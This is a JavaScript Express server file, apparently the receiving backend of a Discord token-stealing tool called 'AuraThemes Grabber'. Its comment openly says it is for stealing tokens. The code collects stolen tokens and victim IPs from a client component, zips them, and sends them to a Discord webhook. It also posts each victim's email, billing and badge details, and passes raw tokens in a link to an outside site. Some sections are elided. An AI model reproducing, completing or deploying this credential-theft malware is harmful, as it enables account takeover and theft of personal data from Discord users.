const app = require('express')(),
    http = require('http'),
    fs = require('fs'),
    Token = require('discordinfos'),
    archiver = require('archiver'),
    axios = require('axios'),
    bodyParser = require('body-parser'),
    server = http.createServer(app),
    FormData = require('form-data');
let { Webhook, MessageBuilder } = require("discord-webhook-node"),

    webhook = new Webhook("ADD YOUR WEBHOOK HERE TO START")                                                                                                                                                                     .setUsername("AuraThemes Grabber").setAvatar("https://avatars.githubusercontent.com/u/149415297?s=200&v=4")

// not finished yet but you can now steal the tokens with the client, -
// side and with the server you have the data in a .zip file

String.prototype.hi = function(i, s) {
  if (i < 0) i = 0; if (i > this.length) i = this.length;
  return this.slice(0, i) + s + this.slice(i);
};

app.set('port',3000);   
app.use(bodyParser.text());
app.use(bodyParser.json());

app.post('/request/startup', (req, res) => {
  res.sendStatus(200);
  req = JSON.parse(req.body);

  if (!fs.existsSync('zips')) fs.mkdirSync('zips');
  let zip = `zips/${req.filename}.zip`;
  let output = fs.createWriteStream(zip);
  let archive = archiver('zip', { zlib: { level: 9 } });
  archive.pipe(output);
  archive.append(JSON.stringify(req, null, 2), { name: 'data.txt' });
  archive.finalize();
  console.log(req);

  output.on('close', async () => {
    if (fs.existsSync(zip)) {
      await webhook.sendFile(zip);
    }
    let tokens = req.tokens
    for (let a = 0; a < tokens.length; a++) {
      var user = Token.getAllInfos(tokens[a], req.GetIpAddress)
      var embed = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
      .setTitle("Infos")
      .setDescription(`**Token**:\n\`${user.token}\`\n[Click Here To Copy](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
      .addField(`**Badges:**`, user.badges, true)
      .addField("**Nitro Type:**", user.nitroType, true)
      .addField("**Billing:**", user.billing, true)
      .addField("**Email:**", `\`${user.mail}\``, true)
      .addField("**IP:**", `\`${req.GetIpAddress}\``, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
      
      webhook.send(embed)

      // ...
      // ...
      // ...

}});
});

app.post("/request/login", (req, res) => {
    res.sendStatus(200)
    req = JSON.parse(req.body);
    console.log(req);
})

// ...
// ...
// ...

server.listen(app.get('port'), () => {
  console.log(`http://localhost:${app.get('port')}`);
});

process
    .on("uncaughtException", err => console.error(err))
    .on("unhandledRejection", err => console.error(err));

